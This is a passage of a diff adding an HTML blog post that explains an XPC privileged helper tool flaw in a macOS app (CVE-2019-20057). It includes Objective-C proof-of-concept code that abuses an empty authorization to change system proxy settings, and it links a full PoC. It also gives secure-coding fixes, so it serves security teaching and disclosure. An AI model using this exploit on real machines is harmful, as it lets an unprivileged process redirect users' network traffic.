+        error <span style="color:#555">=</span> [NSError <span style="color:#99f">errorWithDomain</span>:NSOSStatusErrorDomain <span style="color:#99f">code</span>:paramErr <span style="color:#99f">userInfo</span>:<span style="color:#366">nil</span>];
+    }
+    
+    <span style="color:#09f;font-style:italic">// Create an authorization ref from that the external form data contained within.
+</span><span style="color:#09f;font-style:italic"></span>    
+    <span style="color:#069;font-weight:bold">if</span> (error <span style="color:#555">==</span> <span style="color:#366">nil</span>) {
+        err <span style="color:#555">=</span> AuthorizationCreateFromExternalForm([authData bytes], <span style="color:#555">&amp;</span>authRef);
+        
+        <span style="color:#09f;font-style:italic">// Authorize the right associated with the command.
+</span><span style="color:#09f;font-style:italic"></span>        
+        <span style="color:#069;font-weight:bold">if</span> (err <span style="color:#555">==</span> errAuthorizationSuccess) {
+            AuthorizationItem   oneRight <span style="color:#555">=</span> { <span style="color:#366">NULL</span>, <span style="color:#f60">0</span>, <span style="color:#366">NULL</span>, <span style="color:#f60">0</span> };
+            AuthorizationRights rights   <span style="color:#555">=</span> { <span style="color:#f60">1</span>, <span style="color:#555">&amp;</span>oneRight };
+ 
+            oneRight.name <span style="color:#555">=</span> [[Common <span style="color:#99f">authorizationRightForCommand</span>:command] UTF8String];
+            assert(oneRight.name <span style="color:#555">!=</span> <span style="color:#366">NULL</span>);
+            
+            err <span style="color:#555">=</span> AuthorizationCopyRights(
+                authRef,
+                <span style="color:#555">&amp;</span>rights,
+                <span style="color:#366">NULL</span>,
+                kAuthorizationFlagExtendRights <span style="color:#555">|</span> kAuthorizationFlagInteractionAllowed,
+                <span style="color:#366">NULL</span>
+            );
+        }
+        <span style="color:#069;font-weight:bold">if</span> (err <span style="color:#555">!=</span> errAuthorizationSuccess) {
+            error <span style="color:#555">=</span> [NSError <span style="color:#99f">errorWithDomain</span>:NSOSStatusErrorDomain <span style="color:#99f">code</span>:err <span style="color:#99f">userInfo</span>:<span style="color:#366">nil</span>];
+        }
+    }
+ 
+    <span style="color:#069;font-weight:bold">if</span> (authRef <span style="color:#555">!=</span> <span style="color:#366">NULL</span>) {
+        junk <span style="color:#555">=</span> AuthorizationFree(authRef, <span style="color:#f60">0</span>);
+        assert(junk <span style="color:#555">==</span> errAuthorizationSuccess);
+    }
+ 
+    <span style="color:#069;font-weight:bold">return</span> error;
+}
+</code></pre></div><p>and the decompiled code of the HelperTool:</p>
+<p><img src="https://theevilbit.github.io/images/Secure_coding_XPC_Part1/image1.png" alt="image"></p>
+<h2 id="exploitation">Exploitation</h2>
+<p>It&rsquo;s rather easy in this case. We can easily implement the client based on Apple&rsquo;s original source code, replace the relevant constants, and call the helper tool via its interface. First we define the<code>HelperToolProtocol</code>, which we can easily get with <code>class-dump</code> running against the helper tool.</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec"><span style="color:#069;font-weight:bold">@protocol</span> <span style="color:#0a8;font-weight:bold">HelperToolProtocol</span>
+- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">setProxySystemPreferencesWithAuthorization:</span>(NSData <span style="color:#555">*</span>)<span style="color:#033">arg1</span> <span style="color:#c0f">enabled:</span>(<span style="color:#078;font-weight:bold">BOOL</span>)<span style="color:#033">arg2</span> <span style="color:#c0f">host:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg3</span> <span style="color:#c0f">port:</span>(NSString <span style="color:#555">*</span>)<span style="color:#033">arg4</span> <span style="color:#c0f">reply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSError <span style="color:#555">*</span>, <span style="color:#078;font-weight:bold">BOOL</span>))<span style="color:#033">arg5</span>;
+- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">getVersionWithReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSString <span style="color:#555">*</span>))<span style="color:#033">arg1</span>;
+- (<span style="color:#078;font-weight:bold">void</span>)<span style="color:#c0f">connectWithEndpointReply:</span>(<span style="color:#078;font-weight:bold">void</span> (<span style="color:#555">^</span>)(NSXPCListenerEndpoint <span style="color:#555">*</span>))<span style="color:#033">arg1</span>;
+<span style="color:#069;font-weight:bold">@end</span>
+</code></pre></div><p>Then just use Apple&rsquo;s source to setup an empty authorisation as we saw earlier.</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">err <span style="color:#555">=</span> AuthorizationCreate(<span style="color:#366">NULL</span>, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, <span style="color:#555">&amp;</span>authref);
+<span style="color:#069;font-weight:bold">const</span> <span style="color:#078;font-weight:bold">char</span><span style="color:#555">*</span> str <span style="color:#555">=</span> CFStringGetCStringPtr(SecCopyErrorMessageString(err, <span style="color:#366">nil</span>), kCFStringEncodingMacRoman);
+printf(<span style="color:#c30">&#34;OSStatus: %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,str);
+<span style="color:#069;font-weight:bold">if</span> (err <span style="color:#555">==</span> errAuthorizationSuccess)
+{
+    err <span style="color:#555">=</span> AuthorizationMakeExternalForm(authref, <span style="color:#555">&amp;</span>extForm);
+    str <span style="color:#555">=</span> CFStringGetCStringPtr(SecCopyErrorMessageString(err, <span style="color:#366">nil</span>), kCFStringEncodingMacRoman);
+    printf(<span style="color:#c30">&#34;OSStatus: %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,str);
+}
+<span style="color:#069;font-weight:bold">if</span> (err <span style="color:#555">==</span> errAuthorizationSuccess)
+{
+    authorization <span style="color:#555">=</span> [[NSData alloc] <span style="color:#99f">initWithBytes</span>:<span style="color:#555">&amp;</span>extForm <span style="color:#99f">length</span>:<span style="color:#069;font-weight:bold">sizeof</span>(extForm)];
+    str <span style="color:#555">=</span> CFStringGetCStringPtr(SecCopyErrorMessageString(err, <span style="color:#366">nil</span>), kCFStringEncodingMacRoman);
+    printf(<span style="color:#c30">&#34;OSStatus: %s</span><span style="color:#c30;font-weight:bold">\n</span><span style="color:#c30">&#34;</span>,str);
+}
+assert(err <span style="color:#555">==</span> errAuthorizationSuccess);
+</code></pre></div><p>Lastly just connect to the XPC service:</p>
+<div class="highlight"><pre style="background-color:#f0f3f3;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-objectivec" data-lang="objectivec">NSString<span style="color:#555">*</span>  _serviceName <span style="color:#555">=</span> XPCHelperMachServiceName;
+NSXPCConnection<span style="color:#555">*</span> _agentConnection <span style="color:#555">=</span> [[NSXPCConnection alloc] <span style="color:#99f">initWithMachServiceName</span>:_serviceName <span style="color:#99f">options</span>:<span style="color:#f60">4096</span>];
+[_agentConnection <span style="color:#99f">setRemoteObjectInterface</span>:[NSXPCInterface <span style="color:#99f">interfaceWithProtocol</span>:@protocol(HelperToolProtocol)]];
+[_agentConnection resume];
+
+<span style="color:#078;font-weight:bold">id</span> obj <span style="color:#555">=</span> [_agentConnection <span style="color:#99f">remoteObjectProxyWithErrorHandler</span>:<span style="color:#555">^</span>(NSError<span style="color:#555">*</span> error)
+{
+    (<span style="color:#078;font-weight:bold">void</span>)error;
+    NSLog(<span style="color:#c30">@&#34;Connection Failure&#34;</span>);
+}];
+NSLog(<span style="color:#c30">@&#34;obj: %@&#34;</span>, obj);
+NSLog(<span style="color:#c30">@&#34;conn: %@&#34;</span>, _agentConnection);
+[obj <span style="color:#99f">setProxySystemPreferencesWithAuthorization</span>:authorization <span style="color:#99f">enabled</span>:enab <span style="color:#99f">host</span>:my_proxy <span style="color:#99f">port</span>:my_port <span style="color:#99f">reply</span>:<span style="color:#555">^</span>(NSError <span style="color:#555">*</span> err, <span style="color:#078;font-weight:bold">BOOL</span> b){
+   NSLog(<span style="color:#c30">@&#34;Response, %@&#34;</span>, err);
+        }];
+[obj <span style="color:#99f">setProxySystemPreferencesWithAuthorization</span>:authorization <span style="color:#99f">enabled</span>:enab <span style="color:#99f">host</span>:my_proxy <span style="color:#99f">port</span>:my_port <span style="color:#99f">reply</span>:<span style="color:#555">^</span>(NSError <span style="color:#555">*</span> err, <span style="color:#078;font-weight:bold">BOOL</span> b){
+   NSLog(<span style="color:#c30">@&#34;Response, %@&#34;</span>, err);
+        }];
+NSLog(<span style="color:#c30">@&#34;Done&#34;</span>);
+</code></pre></div><p>Full POC can be downloaded from here:
+<a href="https://github.com/theevilbit/exploits/tree/master/CVE-2019-20057/PMCocoa">exploits/CVE-2019-20057/PMCocoa at master · theevilbit/exploits · GitHub</a></p>
+<h2 id="fix-such-and-similar-issues">Fix such and similar issues</h2>
+<p>I will repeat this in every bog post I write on this topic, spoiling also the coming ones, but I think it&rsquo;s important.</p>
+<ol>
+<li>The client process verification in the <code>shouldAcceptNewConnection</code> call should verify the the following:</li>
+</ol>
+<p>a. The connecting process is signed by Apple
+b. The connecting process is signed by your team ID
+c. The connecting process is identified by your bundle ID
+d. The connecting process has a minimum software version, where the fix has been implemented or it&rsquo;s hardened against injection  attacks.</p>
+<p>For identifying the client at first place, the <code>audit_token</code> should be used instead of the PID, as the second is vulnerable to PID reuse attacks.</p>
+<ol start="2">
+<li>Beyond that the client which is allowed to connect has to be compiled with hardened runtime or library validation, without possessing the following entitlements:</li>
+</ol>
+<pre><code>com.apple.security.cs.allow-dyld-environment-variables
+com.apple.security.cs.disable-library-validation
+com.apple.security.get-task-allow
+</code></pre><p>as these entitlements would allow another process to inject code into the app, and thus allowing it to talk to the helper tool.</p>
+<ol start="3">
+<li>Additionally the connecting client has to be identified by the audit token, and not by PID (process ID).</li>
+</ol>
+<h2 id="future-posts">Future posts</h2>
+<p>Part 2 - will talk about the client part, why it has to run with hardened runtime and why the above entitlements are a big NO. This will likely come only in April, when the example I want to cover is fixed.
+Part 3 - will talk about why the minimum client version is important. Date is unknown yet, as there is no ETA for the bug fix, which I want to cover.</p>
+<h2 id="other-resources">Other resources:</h2>
+<p><a href="https://blog.obdev.at/what-we-have-learned-from-a-vulnerability/">The Story Behind CVE-2019-13013</a></p>
+<p><a href="https://github.com/blankwall/Offensive-Con">GitHub - blankwall/Offensive-Con: Talk and materials for Offensive Con presentation - Privileged Helper Tools</a></p>
+<p><a href="https://www.youtube.com/watch?v=KPzhTqwf0bA">OffensiveCon19 - Tyler Bohan - OSX XPC Revisited - 3rd Party Application Flaws - YouTube</a></p>
+
+      </div>
+
+      <footer>
+        
+
+
+        
+      </footer>
+    </article>
+
+    
+  </section>
+
+      </div>
+
+      <footer class="footer">
+  <section class="container">
+    
+     © 2020
+    
+       · 
+      Powered by <a href="https://gohugo.io/">Hugo</a> & <a href="https://github.com/luizdepra/hugo-coder/">Coder</a>.
+    
+    
+  </section>
+</footer>
+
+    </main>
+
+    
+<script type="application/javascript">
+var doNotTrack = false;
+if (!doNotTrack) {
+	(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+	(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+	m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+	})(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+	ga('create', 'UA-151008930-1', 'auto');
+	
+	ga('send', 'pageview');
+}
+</script>
+
+
+  </body>
+
+</html>
